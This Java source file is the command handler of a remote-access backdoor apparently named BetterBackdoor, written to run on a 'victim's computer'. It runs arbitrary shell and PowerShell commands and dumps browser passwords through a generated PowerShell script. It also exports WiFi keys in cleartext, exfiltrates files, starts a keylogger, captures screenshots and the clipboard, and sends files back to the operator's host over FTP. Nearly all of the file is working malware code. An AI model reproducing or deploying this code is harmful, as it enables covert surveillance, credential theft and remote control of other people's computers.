package com.github.thatcherdev.betterbackdoor.backdoor;

import java.util.Scanner;
import java.awt.datatransfer.DataFlavor;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.io.File;
import java.io.PrintWriter;
import java.util.ArrayList;
import java.util.Arrays;
import javax.imageio.ImageIO;
import com.github.thatcherdev.betterbackdoor.backend.DuckyScripts;
import com.github.thatcherdev.betterbackdoor.backend.FTP;
import com.github.thatcherdev.betterbackdoor.backend.KeyLogger;
import com.github.thatcherdev.betterbackdoor.backend.Utils;
import org.apache.commons.io.FileUtils;

public class HandleCommand {

	/**
	 * Handles command.
	 * <p>
	 * Handles command {@link command} and sets {@link send} to an appropriate
	 * response. Uses {@link Backdoor#out} to send the response followed by a token
	 * to signal the end of the response.
	 *
	 * @param command command given to the backdoor
	 */
	public static void handle(String command) {
		String send = "";
		if (command.equals("help"))
			send = "[cmd] Run Command Prompt commands\n[ps] Run a PowerShell script\n[ds] Run a DuckyScript\n"
					+ "[exfiles] Exfiltarte files based on extension\n[expass] Exfiltrate Microsoft Edge and WiFi passwords\n"
					+ "[filesend] Send a file to victim's computer\n[filerec] Receive a file from victim's computer\n"
					+ "[keylog] Start a KeyLogger on victim's computer\n[ss] Get a screenshot of vitim's computer\n"
					+ "[cb] Get text currently copied to victim's clipboard\n[cat] Get contents of a file on victim's computer\n"
					+ "[remove] Remove backdoor and all backdoor files from victim's computer\n[exit] Exit";
		else if (command.startsWith("cmd"))
			send = Utils.runCommand(command.substring(4));
		else if (command.startsWith("ps") || command.startsWith("ds"))
			try {
				File file = new File(command.substring(3));
				if (command.startsWith("ps") && file.exists())
					send = Utils.runPSScript(command.substring(3));
				else if (command.startsWith("ds") && file.exists() && DuckyScripts.run(command.substring(3)))
					send = "DuckyScript successfully executed";
				else
					throw new Exception();
				FileUtils.forceDelete(file);
			} catch (Exception e) {
				send = "An error occurred when trying to execute script";
				if (e.getMessage() != null)
					send += ":\n" + e.getMessage();
			}
		else if (command.startsWith("exfiles"))
			try {
				Utils.exfilFiles(command.substring(command.indexOf(" "), command.indexOf("*")),
						new ArrayList<String>(Arrays.asList(command.substring(command.indexOf("*") + 1).split(","))));
				send = "Files exfiltrated to '" + Backdoor.gatheredDir + "ExfiltratedFiles' on victim's computer";
			} catch (Exception e) {
				send = "An error occurred when trying to exfiltrate files";
				if (e.getMessage() != null)
					send += ":\n" + e.getMessage();
			}
		else if (command.equals("expass"))
			try {
				File exfilBrowserCreds = new File("ExfilBrowserCreds.ps1");
				PrintWriter out = new PrintWriter(exfilBrowserCreds);
				out.println("$filename=$PSScriptRoot+\"" + Backdoor.gatheredDir + "BrowserPasswords.txt\"\n"
						+ "[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]\n"
						+ "$creds = (New-Object Windows.Security.Credentials.PasswordVault).RetrieveAll()\n"
						+ "foreach ($c in $creds) {$c.RetrievePassword()}\n"
						+ "$creds | Format-List -Property Resource,UserName,Password | Out-File $filename\n"
						+ "echo \"Microsoft Edge and Internet Explorer passwords exfiltrated to '$filename' on vitim's computer\"\n"
						+ "exit");
				out.flush();
				out.close();
				send += Utils.runPSScript(exfilBrowserCreds.getAbsolutePath()) + "\n";
				send += Utils.runCommand("netsh wlan export profile key=clear folder=" + Backdoor.gatheredDir);
				FileUtils.forceDelete(exfilBrowserCreds);
			} catch (Exception e) {
				send = "An error occurred when trying to exfiltrate passwords";
				if (e.getMessage() != null)
					send += ":\n" + e.getMessage();
			}
		else if (command.startsWith("filesend") || command.startsWith("filerec"))
			try {
				if (command.startsWith("filesend")) {
					FTP.backdoor(command.substring(9), "rec", Backdoor.ip);
					send = "File sent";
				} else if (command.startsWith("filerec")) {
					FTP.backdoor(command.substring(8), "send", Backdoor.ip);
					send = "File received";
				}
				while (!FTP.socketTransferDone)
					Thread.sleep(10);
				FTP.socketTransferDone = false;
			} catch (Exception e) {
				send = "An error occurred when trying to transfer file";
				if (e.getMessage() != null)
					send += ":\n" + e.getMessage();
			}
		else if (command.equals("keylog")) {
			Thread keyLogger = new Thread() {
				public void run() {
					KeyLogger.start();
				}
			};
			keyLogger.start();
			send = "Keys are being logged to '" + Backdoor.gatheredDir + "keys.log' on victim's computer";
		} else if (command.equals("ss"))
			try {
				File screenshot = new File(Backdoor.gatheredDir + "screenshot.png");
				ImageIO.write(
						new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize())),
						"png", screenshot);
				FTP.backdoor(screenshot.getAbsolutePath(), "send", Backdoor.ip);
				while (!FTP.socketTransferDone)
					Thread.sleep(10);
				FTP.socketTransferDone = false;
				FileUtils.forceDelete(screenshot);
				send = "Screenshot received";
			} catch (Exception e) {
				send = "An error occurred when trying to received screenshot";
				if (e.getMessage() != null)
					send += ":\n" + e.getMessage();
			}
		else if (command.equals("cb"))
			try {
				String clipBoard = (String) Toolkit.getDefaultToolkit().getSystemClipboard()
						.getData(DataFlavor.stringFlavor);
				if (clipBoard.isEmpty())
					send = "Nothing copied to victim's clipboard";
				else
					send = "Victim's clipboard:\n" + clipBoard;
			} catch (Exception e) {
				send = "An error occurred when trying to get victim's clipboard";
				if (e.getMessage() != null)
					send += ":\n" + e.getMessage();
			}
		else if (command.startsWith("cat"))
			try {
				Scanner in = new Scanner(new File(command.substring(4)));
				while (in.hasNextLine())
					send += in.nextLine() + "\n";
				in.close();
			} catch (Exception e) {
				send = "An error occurred when trying to get file";
				if (e.getMessage() != null)
					send += ":\n" + e.getMessage();
			}
		else if (command.equals("remove"))
			try {
				Runtime.getRuntime().exec("cmd /c ping localhost -n 5 > nul && del /f /q run.jar run.bat && rd /s /q "
						+ Backdoor.gatheredDir + " jre");
				System.exit(0);
			} catch (Exception e) {
				send = "An error occurred when trying to remove files";
				if (e.getMessage() != null)
					send += ":\n" + e.getMessage();
			}
		else if (!command.isEmpty())
			send = "Command not found";
		Backdoor.out.println(send + "\n!$end$!");
	}
}